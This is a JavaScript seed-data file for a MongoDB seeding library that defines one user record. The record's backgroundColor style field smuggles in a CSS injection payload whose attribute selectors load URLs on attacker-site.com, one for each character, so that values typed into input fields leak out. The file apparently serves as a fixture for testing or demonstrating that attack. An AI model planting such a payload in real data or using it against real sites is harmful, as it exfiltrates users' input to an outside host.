const { getObjectId } = require("mongo-seeding");

const data = [
  {
    name: "Victor",
    age: 30,
    isMale: true,
    style: {
      color: "#000",
      backgroundColor: `#eab;
      html:not(&) {
        input[value*="a"] { background: url(https://attacker-site.com/?a) }
        input[value*="b"] { background: url(https://attacker-site.com/?b) }
        input[value*="c"] { background: url(https://attacker-site.com/?c) }
        input[value*="d"] { background: url(https://attacker-site.com/?d) }
        input[value*="e"] { background: url(https://attacker-site.com/?e) }
        input[value*="f"] { background: url(https://attacker-site.com/?f) }
        input[value*="g"] { background: url(https://attacker-site.com/?g) }
        input[value*="r"] { background: url(https://attacker-site.com/?r) }
        input[value*="s"] { background: url(https://attacker-site.com/?s) }
        input[value*="u"] { background: url(https://attacker-site.com/?u) }
      }`,
    },
  },
];

module.exports = data.map((obj) => ({
  ...obj,
  _id: getObjectId(obj.name),
}));
